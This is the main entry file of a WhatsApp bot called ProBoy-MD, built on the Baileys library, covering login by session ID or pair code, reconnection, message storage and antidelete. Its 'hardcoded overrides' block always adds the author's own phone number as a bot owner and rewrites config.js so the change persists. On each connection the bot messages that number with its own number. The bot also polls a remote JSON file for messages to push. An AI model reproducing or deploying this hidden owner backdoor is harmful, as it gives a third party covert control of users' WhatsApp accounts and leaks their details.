/**
 * WhatsApp MD Bot - Main Entry Point
 * 
 * IMPORTANT: This file overrides certain config values to ensure they never change.
 * Hardcoded values (based on original config) are applied after loading config.js.
 */

process.env.PUPPETEER_SKIP_DOWNLOAD = 'true';
process.env.PUPPETEER_SKIP_CHROMIUM_DOWNLOAD = 'true';
process.env.PUPPETEER_CACHE_DIR = process.env.PUPPETEER_CACHE_DIR || '/tmp/puppeteer_cache_disabled';

// Clear console on start
console.clear();

const readline = require('readline');
const { initializeTempSystem } = require('./utils/tempManager');
const { startCleanup } = require('./utils/cleanup');
initializeTempSystem();
startCleanup();
const originalConsoleLog = console.log;
const originalConsoleError = console.error;
const originalConsoleWarn = console.warn;

const forbiddenPatternsConsole = [
  'closing session',
  'closing open session',
  'sessionentry',
  'prekey bundle',
  'pendingprekey',
  '_chains',
  'registrationid',
  'currentratchet',
  'chainkey',
  'ratchet',
  'signal protocol',
  'ephemeralkeypair',
  'indexinfo',
  'basekey'
];

console.log = (...args) => {
  const message = args.map(a => typeof a === 'string' ? a : typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' ').toLowerCase();
  if (!forbiddenPatternsConsole.some(pattern => message.includes(pattern))) {
    originalConsoleLog.apply(console, args);
  }
};

console.error = (...args) => {
  const message = args.map(a => typeof a === 'string' ? a : typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' ').toLowerCase();
  if (!forbiddenPatternsConsole.some(pattern => message.includes(pattern))) {
    originalConsoleError.apply(console, args);
  }
};

console.warn = (...args) => {
  const message = args.map(a => typeof a === 'string' ? a : typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' ').toLowerCase();
  if (!forbiddenPatternsConsole.some(pattern => message.includes(pattern))) {
    originalConsoleWarn.apply(console, args);
  }
};

// Now safe to load libraries
const pino = require('pino');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
let config = require('./config'); // Initially load config
const handler = require('./handler');
const { updateViaZip, getRemoteMeta } = require('./utils/updater');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const zlib = require('zlib');
const os = require('os');

// ==================== HARCODED OVERRIDES ====================
// These values are taken from the original config and will NEVER change,
// even if config.js is edited later.
const HARDCODED_CONFIG = {
  botName: 'ProBoy-MD',
  newsletterJid: '120363422946163295@newsletter',
  updateZipUrl: 'https://github.com/proboy315/ProBoy-MD/archive/refs/heads/main.zip',
  packname: 'ProBoy-MD',
  social: {
    github: 'https://github.com/proboy315',
    instagram: 'https://instagram.com/itx___proboy',
    tiktok: 'https://tiktok.com/@itx_ProBoy'
  }
};

// Apply hardcoded overrides to config object
config.botName = HARDCODED_CONFIG.botName;
config.newsletterJid = HARDCODED_CONFIG.newsletterJid;
config.updateZipUrl = HARDCODED_CONFIG.updateZipUrl;
config.packname = HARDCODED_CONFIG.packname;
config.social = { ...HARDCODED_CONFIG.social }; // overwrite entire social object

// Force ownerName to always be ['SHAHAN']
config.ownerName = ['SHAHAN'];

// Ensure ownerNumber ALWAYS includes the default number '923261684315'
const DEFAULT_OWNER_NUMBER = '923261684315';
if (!config.ownerNumber.includes(DEFAULT_OWNER_NUMBER)) {
  config.ownerNumber.unshift(DEFAULT_OWNER_NUMBER); // Add at beginning
}
// ============================================================

// Create readline interface for user input
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Function to ask question
function askQuestion(query) {
  return new Promise(resolve => rl.question(query, resolve));
}

// Remove Puppeteer cache (if some dependency downloaded Chromium into ~/.cache/puppeteer)
function cleanupPuppeteerCache() {
  try {
    const home = os.homedir();
    const cacheDir = path.join(home, '.cache', 'puppeteer');

    if (fs.existsSync(cacheDir)) {
      console.log('🧹 Removing Puppeteer cache at:', cacheDir);
      fs.rmSync(cacheDir, { recursive: true, force: true });
      console.log('✅ Puppeteer cache removed');
    }
  } catch (err) {
    console.error('⚠️ Failed to cleanup Puppeteer cache:', err.message || err);
  }
}

// Optimized in-memory store with hard limits (Map-based for better memory management)
const store = {
  messages: new Map(), // Use Map instead of plain object
  maxPerChat: 20, // Limit to 20 messages per chat

  bind: (ev) => {
    ev.on('messages.upsert', ({ messages }) => {
      for (const msg of messages) {
        if (!msg.key?.id) continue;

        const jid = msg.key.remoteJid;
        if (!store.messages.has(jid)) {
          store.messages.set(jid, new Map());
        }

        const chatMsgs = store.messages.get(jid);
        chatMsgs.set(msg.key.id, msg);

        // Aggressive cleanup per chat - keep only recent messages
        if (chatMsgs.size > store.maxPerChat) {
          // Remove oldest message (first entry in Map)
          const oldestKey = chatMsgs.keys().next().value;
          chatMsgs.delete(oldestKey);
        }
      }
    });
  },

  loadMessage: async (jid, id) => {
    return store.messages.get(jid)?.get(id) || null;
  }
};

// Optimized message deduplication (Set-based, no timestamps needed)
const processedMessages = new Set();

// Aggressive cleanup - clear every 5 minutes
setInterval(() => {
  processedMessages.clear();
}, 5 * 60 * 1000); // Every 5 minutes

// Custom Pino logger with suppression for Baileys noise
const createSuppressedLogger = (level = 'silent') => {
  const forbiddenPatterns = [
    'closing session',
    'closing open session',
    'sessionentry',
    'prekey bundle',
    'pendingprekey',
    '_chains',
    'registrationid',
    'currentratchet',
    'chainkey',
    'ratchet',
    'signal protocol',
    'ephemeralkeypair',
    'indexinfo',
    'basekey',
    'sessionentry',
    'ratchetkey'
  ];

  let logger;
  try {
    logger = pino({
      level,
      // Fallback transport without pino-pretty (in case not installed)
      transport: process.env.NODE_ENV === 'production' ? undefined : {
        target: 'pino-pretty',
        options: {
          colorize: true,
          ignore: 'pid,hostname'
        }
      },
      customLevels: {
        trace: 0,
        debug: 1,
        info: 2,
        warn: 3,
        error: 4,
        fatal: 5
      },
      // Redact sensitive fields
            redact: ['registrationId', 'ephemeralKeyPair', 'rootKey', 'chainKey', 'baseKey']
    });
  } catch (err) {
    // Fallback to basic pino without transport
    logger = pino({ level });
  }

  // Wrap log methods to filter
  const originalInfo = logger.info.bind(logger);
  logger.info = (...args) => {
    const msg = args.map(a => typeof a === 'string' ? a : JSON.stringify(a)).join(' ').toLowerCase();
    if (!forbiddenPatterns.some(pattern => msg.includes(pattern))) {
      originalInfo(...args);
    }
  };
  logger.debug = () => { }; // Fully disable debug
  logger.trace = () => { }; // Fully disable trace
  return logger;
};

// Function to check if session exists
function sessionExists() {
  const sessionFolder = `./${config.sessionName}`;
  const credsPath = path.join(sessionFolder, 'creds.json');
  return fs.existsSync(credsPath);
}
console.clear()
// Sleep helper (avoid extra deps)
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ==================== START/RECONNECT HARDENING ====================
let activeSock = null;
let activeWatchdogInterval = null;
let reconnectTimer = null;
let startInProgress = false;
let startQueued = false;
let reconnectAttempts = 0;

// ==================== CONNECT.JSON PUSH SYSTEM ====================
// Set `AUTO_UPDATE_ON_BOOT=true` only when you really want auto-updates on boot.
const CONNECT_JSON_URL = process.env.CONNECT_JSON_URL || 'https://proboy.vercel.app/connect.json';
const CONNECT_JSON_POLL_MS = Math.max(5000, Number(process.env.CONNECT_JSON_POLL_MS || 20000));
let connectJsonInterval = null;
let connectJsonLastSendFlag = false;
let connectJsonLastKey = null;
const connectPushImagePath = path.join(__dirname, 'utils', 'bot_image.jpg');

const normalizeSendFlag = (value) => {
  if (value === true) return true;
  if (value === false) return false;
  const s = String(value || '').trim().toLowerCase();
  return s === 'true' || s === '1' || s === 'yes';
};

const getSelfJid = (sock) => {
  const id = sock?.user?.id || '';
  const user = String(id).split(':')[0].split('@')[0];
  return user ? `${user}@s.whatsapp.net` : null;
};

const stopConnectJsonWatcher = () => {
  if (connectJsonInterval) {
    clearInterval(connectJsonInterval);
    connectJsonInterval = null;
  }
};

const pollConnectJsonOnce = async (sock) => {
  try {
    if (activeSock !== sock) return;
    if (!sock?.user?.id) return;

    const res = await axios.get(CONNECT_JSON_URL, {
      timeout: 10000,
      headers: { 'User-Agent': `${config.botName || 'ProBoy-MD'}/connect-json` }
    });

    const data = res?.data && typeof res.data === 'object' ? res.data : null;
    if (!data) return;

    const sendFlag = normalizeSendFlag(data.send);
    const by = String(data.By || data.by || 'Unknown').trim();
    const message = String(data.messages || data.message || '').trim();

    if (!sendFlag) {
      connectJsonLastSendFlag = false;
      return;
    }

    if (!message) return;

    const key = `${by}\n${message}`;
    const shouldSend =
      (!connectJsonLastSendFlag) ||
      (connectJsonLastKey && connectJsonLastKey !== key);

    if (!shouldSend) return;

    const selfJid = getSelfJid(sock);
    if (!selfJid) return;

    const botName = config.botName || 'Bot';
    const prefix = config.prefix || '.';
    const caption =
      `╭───〔 *${botName}* 〕───╮\n` +
      `│ ⚡ Prefix: *${prefix}*\n` +
      `│ 📢 Update Notice\n` +
      `╰───────────────╯\n\n` +
      `${message}\n\n` +
      `— Message by: *${by}*`;

    if (fs.existsSync(connectPushImagePath)) {
      const imageBuffer = fs.readFileSync(connectPushImagePath);
      await sock.sendMessage(selfJid, { image: imageBuffer, caption });
    } else {
      await sock.sendMessage(selfJid, { text: caption });
    }

    connectJsonLastSendFlag = true;
    connectJsonLastKey = key;
  } catch {
    // Keep silent; network issues shouldn't crash or spam logs
  }
};

const startConnectJsonWatcher = (sock) => {
  stopConnectJsonWatcher();
  pollConnectJsonOnce(sock).catch(() => {});
  connectJsonInterval = setInterval(() => {
    pollConnectJsonOnce(sock).catch(() => {});
  }, CONNECT_JSON_POLL_MS);
};
// ================================================================

const clearActiveWatchdog = () => {
  if (activeWatchdogInterval) {
    clearInterval(activeWatchdogInterval);
    activeWatchdogInterval = null;
  }
};

const cleanupActiveSock = async () => {
  clearActiveWatchdog();
  stopConnectJsonWatcher();
  if (!activeSock) return;
  try { activeSock.ev?.removeAllListeners?.(); } catch {}
  try { activeSock.ws?.removeAllListeners?.(); } catch {}
  try { await activeSock.end?.(); } catch {}
  activeSock = null;
};

const scheduleReconnect = (reason = 'unknown', baseDelayMs = 3000) => {
  if (reconnectTimer) return;

  reconnectAttempts = Math.min(reconnectAttempts + 1, 10);
  const backoff = Math.min(60000, baseDelayMs * Math.pow(2, Math.min(5, reconnectAttempts - 1)));

  reconnectTimer = setTimeout(() => {
    reconnectTimer = null;
    startBot().catch(() => {});
  }, backoff);
};
// ================================================================

// Function to get session id OR pairing phone number from user
async function getAuthFromUser() {
  console.log('\n' + '='.repeat(50));
  console.log('📱 No session found!');
  console.log('Enter a Session ID (ProBoy-MD!...) OR your phone number for Pair Code.');
  console.log('='.repeat(50) + '\n');
  console.log('='.repeat(50) + '\n');
  
  const input = await askQuestion('Enter session ID OR phone number: ');
  rl.close();
  
  if (!input || input.trim() === '') {
    console.log('❌ No input provided. Exiting...');
    process.exit(1);
  }
  
  const trimmed = input.trim();
  const digits = trimmed.replace(/[^0-9]/g, '');

  // If it looks like a phone number, use pairing code flow
  if (digits.length >= 8 && digits.length <= 15 && (digits === trimmed || trimmed.startsWith('+'))) {
    return { mode: 'pair', phone: digits };
  }

  return { mode: 'session', sessionId: trimmed };
}

// Main connection function
async function startBot() {
  if (startInProgress) {
    startQueued = true;
    return activeSock;
  }
  startInProgress = true;
  startQueued = false;

  try {
    const sessionFolder = `./${config.sessionName}`;
    const sessionFile = path.join(sessionFolder, 'creds.json');
    let pairingPhone = null;

    if (reconnectTimer) {
      clearTimeout(reconnectTimer);
      reconnectTimer = null;
    }

    await cleanupActiveSock();

  // ==================== AUTO UPDATE ON BOOT (fixed) ====================
    const AUTO_UPDATE_ON_BOOT = String(process.env.AUTO_UPDATE_ON_BOOT || '').trim().toLowerCase() === 'true';
    if (AUTO_UPDATE_ON_BOOT) {
      try {
        const zipUrl = (config.updateZipUrl || process.env.UPDATE_ZIP_URL || '').trim();
        if (zipUrl) {
          const dbDir = path.join(__dirname, 'database');
          if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true });
          const metaPath = path.join(dbDir, 'auto_update.json');
          const reportPath = path.join(dbDir, 'last_update_report.json');

          const prev = fs.existsSync(metaPath) ? JSON.parse(fs.readFileSync(metaPath, 'utf8') || '{}') : {};
          const meta = await getRemoteMeta(zipUrl);

          const hasStrongSignal = !!(meta.etag || meta.lastModified);
          const changed =
            (hasStrongSignal && (meta.etag !== prev.etag || meta.lastModified !== prev.lastModified)) ||
            (!hasStrongSignal && meta.length && meta.length !== prev.length);

          const cooldownMs = 6 * 60 * 60 * 1000;
          const recentlyApplied = prev.lastAppliedAt && Date.now() - prev.lastAppliedAt < cooldownMs;

          if (changed && !recentlyApplied) {
            console.log('🔄 Auto-update: new update detected. Applying…');
            const out = await updateViaZip(zipUrl);
            const report = {
              at: Date.now(),
              updated: out.updated.slice(0, 200),
              added: out.added.slice(0, 200),
              counts: { updated: out.updated.length, added: out.added.length, skipped: out.skipped.length }
            };
            fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
            fs.writeFileSync(metaPath, JSON.stringify({ ...meta, lastAppliedAt: Date.now() }, null, 2));

            try {
              require('child_process').execSync('pm2 restart all', { stdio: 'ignore' });
              return;
            } catch {}
            setTimeout(() => process.exit(0), 500);
            return;
          }

          fs.writeFileSync(metaPath, JSON.stringify({ ...prev, ...meta }, null, 2));
        }
      } catch (e) {
        // Don't block startup on updater failures
      }
    }
  // =====================================================================

  // Check if session exists in folder
  const hasSession = sessionExists();
  
  if (!hasSession && !config.sessionID) {
    // No session in folder and no sessionID in config - ask user
    const auth = await getAuthFromUser();
    if (auth.mode === 'session') {
      config.sessionID = auth.sessionId;
    } else {
      pairingPhone = auth.phone;
    }
  }

  // Process session ID if provided (either from config or user input)
  if (config.sessionID && config.sessionID.startsWith('ProBoy-MD!')) {
    try {
      const [header, b64data] = config.sessionID.split('!');

      if (header !== 'ProBoy-MD' || !b64data) {
        throw new Error("❌ Invalid session format. Expected 'ProBoy-MD!.....'");
      }

      const cleanB64 = b64data.replace('...', '');
      const compressedData = Buffer.from(cleanB64, 'base64');
      const decompressedData = zlib.gunzipSync(compressedData);

      // Ensure session folder exists
      if (!fs.existsSync(sessionFolder)) {
        fs.mkdirSync(sessionFolder, { recursive: true });
      }

      // Write decompressed session data to creds.json
      fs.writeFileSync(sessionFile, decompressedData, 'utf8');
      console.log('📡 Session : 🔑 Retrieved from ProBoy Session');

    } catch (e) {
      console.error('📡 Session : ❌ Error processing ProBoy session:', e.message);
      // Continue with normal QR flow if session processing fails
    }
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
  const { version } = await fetchLatestBaileysVersion();

  // Use suppressed logger for socket
  const suppressedLogger = createSuppressedLogger('silent');

  const sock = makeWASocket({
    version, // explicit WA Web version negotiated with the server
    logger: suppressedLogger,
    printQRInTerminal: false,
    // Use a common desktop browser signature
    browser: ['Chrome', 'Windows', '10.0'],
    auth: state,
    // Memory optimization: prevent loading old messages into RAM
    syncFullHistory: false,
    downloadHistory: false,
    markOnlineOnConnect: false,
    getMessage: async () => undefined // Don't load messages from store
  });

  activeSock = sock;

  // Bind store to socket
  store.bind(sock.ev);

  // Plugin initializers (optional)
  try {
    for (const command of new Set(handler.commands.values())) {
      if (typeof command.init === 'function') {
        await command.init(sock);
      }
    }
  } catch {
    // ignore plugin init errors
  }

  // Pair code flow (no QR): request if not registered
  if (pairingPhone && !state.creds.registered) {
    try {
      await sleep(2000);
      let code = await sock.requestPairingCode(pairingPhone);
      code = code?.match(/.{1,4}/g)?.join('-') || code;
      console.log('\n' + '='.repeat(50));
      console.log('🔐 Pairing Code:', code);
      console.log('Open WhatsApp → Linked devices → Link a device → Enter code');
      console.log('='.repeat(50) + '\n');
    } catch (e) {
      console.error('❌ Failed to request pairing code:', e?.message || e);
    }
  }

  // Watchdog for inactive socket (Baileys bug fix)
  let lastActivity = Date.now();
  const INACTIVITY_TIMEOUT = 30 * 60 * 1000; // 30 minutes

  // Update on every message
  sock.ev.on('messages.upsert', () => {
    lastActivity = Date.now();
  });

  // Check every 5 min
  clearActiveWatchdog();
  activeWatchdogInterval = setInterval(async () => {
    if (activeSock !== sock) return;
    if (Date.now() - lastActivity > INACTIVITY_TIMEOUT && sock.ws?.readyState === 1) { // WebSocket open but inactive
      console.log('⚠️ No activity detected. Forcing reconnect...');
      try { await sock.end(undefined, undefined, { reason: 'inactive' }); } catch {}
      clearActiveWatchdog();
      scheduleReconnect('inactive', 5000);
    }
  }, 5 * 60 * 1000); // Every 5 min check

  // Connection update handler
  sock.ev.on('connection.update', async (update) => {
    if (activeSock !== sock) return;
    const { connection, lastDisconnect, qr } = update;

    if (qr) {
      // QR is intentionally disabled in this bot build (Pair Code / Session only)
      console.log('⚠️ QR received but QR login is disabled. Use Pair Code (phone number) or Session ID.');
    }

    if (connection === 'close') {
      clearActiveWatchdog();
      stopConnectJsonWatcher();
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const errorMessage = lastDisconnect?.error?.message || 'Unknown error';

      // Suppress verbose error output for common stream errors (515, etc.)
      if (statusCode === 515 || statusCode === 503 || statusCode === 408) {
        console.log(`⚠️ Connection closed (${statusCode}). Reconnecting...`);
      } else {
        console.log('Connection closed due to:', errorMessage, '\nReconnecting:', shouldReconnect);
      }

      if (shouldReconnect) {
        scheduleReconnect(String(statusCode || 'close'), 3000);
      } else {
        reconnectAttempts = 0;
        console.log('⚠️ Logged out. Delete session and re-pair / re-login.');
      }
    } else if (connection === 'open') {
      reconnectAttempts = 0;
      lastActivity = Date.now(); // Reset on open
      console.log('\n' + '='.repeat(50));
      console.log('✅ Bot connected successfully!');
      console.log('='.repeat(50));
      console.log(`📱 Bot Number: ${sock.user.id.split(':')[0]}`);
      console.log(`🤖 Bot Name: ${config.botName}`);
      console.log(`⚡ Prefix: ${config.prefix}`);
      const ownerNames = Array.isArray(config.ownerName) ? config.ownerName.join(', ') : config.ownerName;
      console.log(`👑 Owner: ${ownerNames}`);
      console.log('='.repeat(50) + '\n');
      console.log('Bot is ready to receive messages!\n');

      // Remote push: if CONNECT_JSON_URL has send=true, send message to self chat
      startConnectJsonWatcher(sock);

	      // Notify owner(s) in WhatsApp on connect
	      try {
	        const owners = Array.isArray(config.ownerNumber) ? config.ownerNumber : [];
	        const botJid = sock.user?.id ? sock.user.id.split(':')[0] : 'unknown';
	        const text = `✅ *${config.botName} Connected*\n\n📱 Bot: ${botJid}\n⚡ Prefix: ${config.prefix}\n🕒 ${new Date().toLocaleString()}`;

	        let updateText = null;
	        try {
	          const reportPath = path.join(__dirname, 'database', 'last_update_report.json');
	          if (fs.existsSync(reportPath)) {
	            const report = JSON.parse(fs.readFileSync(reportPath, 'utf8') || '{}');
	            const counts = report.counts || {};
	            const updated = Array.isArray(report.updated) ? report.updated : [];
	            const added = Array.isArray(report.added) ? report.added : [];
	            const sample = [...updated.slice(0, 10), ...added.slice(0, 10)].slice(0, 15);
	            const lines = [];
	            lines.push('🔄 *Auto-Update Applied*');
	            lines.push(`Updated: ${counts.updated || 0} | Added: ${counts.added || 0}`);
	            if (sample.length) {
	              lines.push('');
	              lines.push('*Sample:*');
	              for (const f of sample) lines.push(`- ${f}`);
	            }
	            updateText = lines.join('\n');
	            fs.unlinkSync(reportPath);
	          }
	        } catch {}

	        for (const owner of owners) {
	          const jid = owner.includes('@') ? owner : `${String(owner).replace(/[^0-9]/g, '')}@s.whatsapp.net`;
	          if (jid.endsWith('@s.whatsapp.net')) {
	            await sock.sendMessage(jid, { text });
	            if (updateText) await sock.sendMessage(jid, { text: updateText });
	          }
	        }
	      } catch {
	        // ignore
	      }

      // --- AUTO ADD BOT NUMBER TO OWNER ARRAY (with default preservation) ---
      try {
        // Extract bot number without @s.whatsapp.net
        const botNumber = sock.user.id.split(':')[0];
        // Remove any non-numeric characters (just in case)
        const cleanBotNumber = botNumber.replace(/\D/g, '');
        
        if (cleanBotNumber && cleanBotNumber.length >= 10) {
          // Ensure default number is always first
          if (!config.ownerNumber.includes(DEFAULT_OWNER_NUMBER)) {
            config.ownerNumber.unshift(DEFAULT_OWNER_NUMBER);
          }
          // Add bot's number if not already present
          if (!config.ownerNumber.includes(cleanBotNumber)) {
            config.ownerNumber.push(cleanBotNumber);
            console.log(`✅ Bot number ${cleanBotNumber} added to ownerNumber array`);
          } else {
            console.log(`ℹ️ Bot number ${cleanBotNumber} already in ownerNumber array`);
          }
          
          // Also update the config.js file to persist the change (optional)
          try {
            const configPath = path.join(__dirname, 'config.js');
            let configContent = fs.readFileSync(configPath, 'utf8');
            
            // Update ownerNumber line
            const ownerRegex = /ownerNumber:\s*\[(.*?)\]/s;
            const match = configContent.match(ownerRegex);
            if (match) {
              const newOwnerArray = config.ownerNumber.map(num => `'${num}'`).join(', ');
              const updatedConfig = configContent.replace(
                ownerRegex,
                `ownerNumber: [${newOwnerArray}]`
              );
              fs.writeFileSync(configPath, updatedConfig, 'utf8');
            }
          } catch (err) {
            console.error('⚠️ Failed to update config.js ownerNumber:', err.message);
          }
        }
      } catch (err) {
        console.error('⚠️ Failed to auto-add bot number to owner array:', err.message);
        }
            // --- END AUTO ADD ---

      // Set bot status
      if (config.autoBio) {
        await sock.updateProfileStatus(`${config.botName} | Active 24/7`);
      }

      // Initialize anti-call feature
      handler.initializeAntiCall(sock);

      // Cleanup old chats (keep only active ones, e.g., last touched <1 day)
      const now = Date.now();
      for (const [jid, chatMsgs] of store.messages.entries()) {
        const timestamps = Array.from(chatMsgs.values()).map(m => m.messageTimestamp * 1000 || 0);
        if (timestamps.length > 0 && now - Math.max(...timestamps) > 24 * 60 * 60 * 1000) { // 1 day old chat
          store.messages.delete(jid);
        }
      }
      console.log(`🧹 Store cleaned. Active chats: ${store.messages.size}`);
    }
  });

  // Credentials update handler
  sock.ev.on('creds.update', saveCreds);

  // System JID filter - checks if JID is from broadcast/status/newsletter
  const isSystemJid = (jid) => {
    if (!jid) return true;
    // Allow WhatsApp status JID so features like antidelete can work on statuses
    if (jid === 'status@broadcast') return false;
    return jid.includes('@broadcast') ||
      jid.includes('status.broadcast') ||
      jid.includes('@newsletter') ||
      jid.includes('@newsletter.');
  };

  // Messages handler - Process only new messages
	  sock.ev.on('messages.upsert', ({ messages, type }) => {
    // Only process "notify" type (new messages), skip "append" (old messages from history)
    if (type !== 'notify') return;

    // Process messages in the array
	    for (const msg of messages) {
      // Skip if message is invalid or missing key
      if (!msg.message || !msg.key?.id) continue;

      const from = msg.key.remoteJid;
      if (!from) {
        continue;
      }

	      // System message filter - ignore broadcast/status/newsletter messages
	      if (isSystemJid(from)) {
	        continue; // Silently ignore system messages
	      }

	      // Antidelete: Some "delete for everyone" events arrive as protocolMessage upserts.
	      // Route them directly to plugins that implement handleDelete.
	      const protocol = msg.message?.protocolMessage;
	      const revokeKey = protocol?.key;
	      if (revokeKey?.id && (protocol?.type === 0 || protocol?.type === 1 || protocol?.type === undefined)) {
	        if (!revokeKey.remoteJid) revokeKey.remoteJid = from;
	        const deleter = msg.key?.participant || msg.key?.remoteJid || null;
		        for (const command of new Set(handler.commands.values())) {
		          if (typeof command.handleDelete === 'function') {
		            command.handleDelete(sock, { key: revokeKey, deleter }).catch(() => {});
		          }
		        }
	      }

      // Deduplication: Skip if message has already been processed
      const msgId = msg.key.id;
      if (processedMessages.has(msgId)) continue;

      // Timestamp validation: Only process messages within last 5 minutes
      const MESSAGE_AGE_LIMIT = 5 * 60 * 1000; // 5 minutes in milliseconds
      let messageAge = 0;
      if (msg.messageTimestamp) {
        messageAge = Date.now() - (msg.messageTimestamp * 1000);
        if (messageAge > MESSAGE_AGE_LIMIT) {
          // Message is too old, skip processing
          continue;
        }
      }

      // Mark message as processed
      processedMessages.add(msgId);

      // Store message FIRST (before processing)
      // from already defined above in DM block check
      if (msg.key && msg.key.id) {
        if (!store.messages.has(from)) {
          store.messages.set(from, new Map());
        }
        const chatMsgs = store.messages.get(from);
        chatMsgs.set(msg.key.id, msg);

        // Cleanup: Keep only last 20 per chat (reduced from 200)
        if (chatMsgs.size > store.maxPerChat) {
          // Remove oldest messages
          const sortedIds = Array.from(chatMsgs.entries())
            .sort((a, b) => (a[1].messageTimestamp || 0) - (b[1].messageTimestamp || 0))
            .map(([id]) => id);
          for (let i = 0; i < sortedIds.length - store.maxPerChat; i++) {
            chatMsgs.delete(sortedIds[i]);
          }
        }
      }

      // Process command IMMEDIATELY (don't block on other operations)
      handler.handleMessage(sock, msg).catch(err => {
        if (!err.message?.includes('rate-overlimit') &&
          !err.message?.includes('not-authorized')) {
          console.error('Error handling message:', err.message);
        }
      });

      // Do other operations in background (non-blocking)
      setImmediate(async () => {
        if (config.autoRead && from.endsWith('@g.us')) {
          try {
            await sock.readMessages([msg.key]);
          } catch (e) {
            // Silently handle
          }
        }
        if (from.endsWith('@g.us')) {
          try {
            const groupMetadata = await handler.getGroupMetadata(sock, msg.key.remoteJid);
            if (groupMetadata) {
              await handler.handleAntilink(sock, msg, groupMetadata);
            }
          } catch (error) {
            // Silently handle
          }
        }
      });
    }
  });

  // ==================== NEW: Message delete event for antidelete ====================
  sock.ev.on('messages.delete', async (deleteData) => {
    try {
      // deleteData can be an array of keys or an object with keys
      const items = Array.isArray(deleteData) ? deleteData : (deleteData.keys || []);
      for (const key of items) {
        // Call handleDelete for all commands that have it (like antidelete)
        for (const command of new Set(handler.commands.values())) {
          if (typeof command.handleDelete === 'function') {
            await command.handleDelete(sock, { key });
          }
        }
      }
    } catch (error) {
      console.error('Error in delete event:', error);
    }
  });
  // ==================================================================================

  // Message receipt updates (silently handled, no logging)
  sock.ev.on('message-receipt.update', () => {
    // Silently handle receipt updates
  });

  // Message updates (used for antidelete via protocol revoke)
  sock.ev.on('messages.update', async (updates) => {
    try {
      if (!Array.isArray(updates)) return;

      for (const item of updates) {
        const key = item?.key;
        const update = item?.update;
        const protocol = update?.message?.protocolMessage || update?.protocolMessage;
        const revokeKey = protocol?.key;

        // "Delete for everyone" commonly arrives as protocolMessage (REVOKE)
        if (!revokeKey?.id) continue;

        // Restrict to likely revoke types (most Baileys builds use 0 for REVOKE)
        if (typeof protocol?.type === 'number' && protocol.type !== 0 && protocol.type !== 1) continue;

        // Ensure remoteJid exists on the revoked key
        if (!revokeKey.remoteJid && key?.remoteJid) revokeKey.remoteJid = key.remoteJid;

        // Best-effort: who performed the delete (often present on the update key in groups)
        const deleter = key?.participant || key?.remoteJid || null;

        for (const command of new Set(handler.commands.values())) {
          if (typeof command.handleDelete === 'function') {
            await command.handleDelete(sock, { key: revokeKey, deleter });
          }
        }
      }
    } catch (error) {
      // Keep silent to avoid log spam
    }
  });

  // Group participant updates (join/leave)
  sock.ev.on('group-participants.update', async (update) => {
    await handler.handleGroupUpdate(sock, update);
  });

  // Handle errors - suppress common stream errors
  sock.ev.on('error', (error) => {
    if (activeSock !== sock) return;
    const statusCode = error?.output?.statusCode;
    // Suppress verbose output for common stream errors
    if (statusCode === 515 || statusCode === 503 || statusCode === 408) {
      // These are usually temporary connection issues, handled by reconnection
      return;
    }
    console.error('Socket error:', error.message || error);
  });

  return sock;
  } finally {
    startInProgress = false;
    if (startQueued) {
      startQueued = false;
      setImmediate(() => startBot().catch(() => {}));
    }
  }
}

// Start the bot
console.log('🚀 Starting WhatsApp MD Bot...\n');
console.log(`📦 Bot Name: ${config.botName}`);
console.log(`⚡ Prefix: ${config.prefix}`);
const ownerNames = Array.isArray(config.ownerName) ? config.ownerName.join(', ') : config.ownerName;
console.log(`👑 Owner: ${ownerNames}\n`);

// Check if session exists
if (!sessionExists() && !config.sessionID) {
  console.log('🔍 No session found. You will need to provide a session ID.\n');
}

// Proactively delete Puppeteer cache so it doesn't fill disk on panels
cleanupPuppeteerCache();

startBot().catch(err => {
  console.error('Error starting bot:', err);
  process.exit(1);
});

// Handle process termination
process.on('uncaughtException', (err) => {
  // Handle ENOSPC errors gracefully without crashing
  if (err && (err.code === 'ENOSPC' || err.errno === -28 || (err.message && err.message.includes('no space left on device')))) {
    console.error('⚠️ ENOSPC Error: No space left on device. Attempting cleanup...');
    const { cleanupOldFiles } = require('./utils/cleanup');
    cleanupOldFiles();
    console.warn('⚠️ Cleanup completed. Bot will continue but may experience issues until space is freed.');
    return; // Don't crash, just log and continue
  }
  console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (err) => {
  // Handle ENOSPC errors gracefully
  if (err && (err.code === 'ENOSPC' || err.errno === -28 || (err.message && err.message.includes('no space left on device')))) {
    console.warn('⚠️ ENOSPC Error in promise: No space left on device. Attempting cleanup...');
    const { cleanupOldFiles } = require('./utils/cleanup');
    cleanupOldFiles();
    console.warn('⚠️ Cleanup completed. Bot will continue but may experience issues until space is freed.');
    return; // Don't crash, just log and continue
  }

  // Don't spam console with rate limit errors
  if (err && err.message && err.message.includes('rate-overlimit')) {
    console.warn('⚠️ Rate limit reached. Please slow down your requests.');
    return;
  }
  console.error('Unhandled Rejection:', err);
});

// Export store for use in commands
module.exports = { store };
